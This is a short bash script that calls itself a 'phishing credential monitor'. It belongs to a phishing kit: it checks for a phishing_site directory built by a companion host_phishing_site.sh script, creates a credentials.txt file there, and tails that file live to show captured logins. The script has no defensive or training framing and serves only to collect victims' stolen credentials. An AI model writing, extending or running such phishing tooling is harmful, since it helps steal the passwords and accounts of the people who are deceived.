#!/bin/bash

# Set text colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Banner
echo -e "${YELLOW}"
echo "╔═════════════════════════════════════════════════╗"
echo "║                                                 ║"
echo "║        PHISHING CREDENTIAL MONITOR              ║"
echo "║                                                 ║"
echo "╚═════════════════════════════════════════════════╝"
echo -e "${NC}"

# Check if phishing_site directory exists
if [ ! -d "phishing_site" ]; then
    echo -e "${RED}[ERROR]${NC} Phishing site directory not found. Please run host_phishing_site.sh first."
    exit 1
fi

# Check if credentials file exists
CREDS_FILE="phishing_site/credentials.txt"
if [ ! -f "$CREDS_FILE" ]; then
    echo -e "${YELLOW}[INFO]${NC} No credentials file found. Creating an empty one."
    touch "$CREDS_FILE"
fi

# Display usage information
echo -e "${GREEN}[INFO]${NC} Monitoring for captured credentials..."
echo -e "${YELLOW}[TIP]${NC} Press Ctrl+C to stop monitoring\n"

# Monitor the credentials file
tail -f "$CREDS_FILE" 